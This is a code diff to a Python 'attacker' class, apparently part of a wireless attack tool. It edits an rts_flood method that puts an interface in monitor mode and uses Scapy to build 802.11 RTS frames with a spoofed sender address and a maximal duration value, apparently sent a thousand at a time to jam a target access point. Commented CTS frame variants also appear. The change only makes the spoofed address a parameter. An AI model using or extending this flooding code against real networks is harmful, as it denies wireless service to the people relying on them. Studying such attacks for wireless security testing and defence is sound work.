@@ -34,7 +34,7 @@ class attacker:
     #         time.sleep(1)
 
     # target_addr = '05:12:54:15:54:11', my_addr = '07:12:54:15:54:11'
-    def rts_flood(self, BSSID, Freq, Channel):
+    def rts_flood(self, BSSID, Freq, Channel, attacking_addr='05:12:54:15:54:11'):
         self.screen = Drawer.drawer()
 
         self.attack_int = self.__start_monitor_mode(self.attack_int)
@@ -47,7 +47,7 @@ class attacker:
         bytes = struct.pack("<H", 32768)  # 32767 microseconds
         timeval = struct.unpack(">H", bytes)[0]
         # print(timeval)
-        frame = RadioTap() / Dot11(type=1, subtype=11, addr1 = BSSID, addr2 = '05:12:54:15:54:11', ID=timeval)
+        frame = RadioTap() / Dot11(type=1, subtype=11, addr1 = BSSID, addr2=attacking_addr, ID=timeval)
         # RadioTap() / Dot11(type=1, subtype=11, addr1 = target_addr, addr2 = my_addr, ID=timeval) #RTS
         # RadioTap() / Dot11(type=1, subtype=12, addr1 = target_addr, ID=timeval) #CTS
         quantity = 1000
